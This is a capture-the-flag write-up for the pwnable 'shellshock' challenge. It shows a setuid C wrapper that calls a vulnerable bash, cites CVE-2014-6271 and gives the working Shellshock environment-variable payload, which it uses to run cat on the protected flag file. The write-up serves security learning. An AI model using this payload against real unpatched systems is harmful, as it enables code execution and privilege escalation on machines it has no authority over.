# Shellshock

**Description**:

## Source code:

```C
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

### Solution:

The executable file set effective user to help us "cat" **flag** file.

With the hints, i try "googling" about "bash shock" and "shellshock", it relates to the **CVE-2014-6271**

A quote in this CVE:

```
GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment
```

Reference about CVE : https://www.cve.org/CVERecord?id=CVE-2014-6271

Check the version of bash: `bash --version`, we got: 

```
GNU bash, version 4.3.48(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

So this **bash** shell is vulnerable. Try the payload in CVE: 

```bash
shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' ./shellshock
vulnerable
shock_me
```
So it's worked. Find 'cat' path by **which** command and embed our command: `env x='() { :;}; /bin/cat flag' ./shellshock`

Flag: **only if I knew CVE-2014-6271 ten years ago..!!**
